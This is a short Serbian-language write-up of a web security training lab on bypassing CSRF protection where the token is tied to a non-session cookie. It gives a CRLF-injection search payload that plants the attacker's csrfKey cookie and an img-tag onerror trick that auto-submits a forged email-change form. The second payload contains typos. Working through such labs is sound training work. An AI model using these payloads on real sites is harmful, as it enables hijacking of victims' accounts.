# Lab: CSRF where token is tied to non-session cookie

zahtev ima csrf token kao parametar i csrfkey kao cookie u headeru
da bi prošli validaciju moramo žrtvu da nahranimo našim kolačićem  i našim tokenom
to možemo da uradimo jer server ne proverava čiji je par kolačića i token tj nije vezan za session token

csrf token se može ubaciti kao u prethodnom zadatku ali csrfkey cookie je malo teže o potrebno je malo više slabosti u sistemu

sajt ima search bar koji nakon svakog searcha ubaci cookie "last search Term"
pošto vidimo da search bara manipuliše cookijima možemo pomoću njega da uguramo i naš cookie


zahtev koji bi ubacio naš cookie:
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None

sada samo mormao da pošaljemo taj zahtev sa naše super fejk stranice a to možemo pomoću img taga

<img src="https://0a330073045b960f81b57a7e00cb0007.web-security-academy.net/?search=test%0d%0aSet-Cookir:%20csrfKey=yurk0YIQPCXS6F8gJw30Mmn1S5c4Lb4P%03$20SameSite=None" onerror="document.forms[0].submit()">

i nakon što pozove get zahtev i postavi naš otrovan cookie pošto slika ne postoji odma će se pozvati on error tj submit za izmenu emaila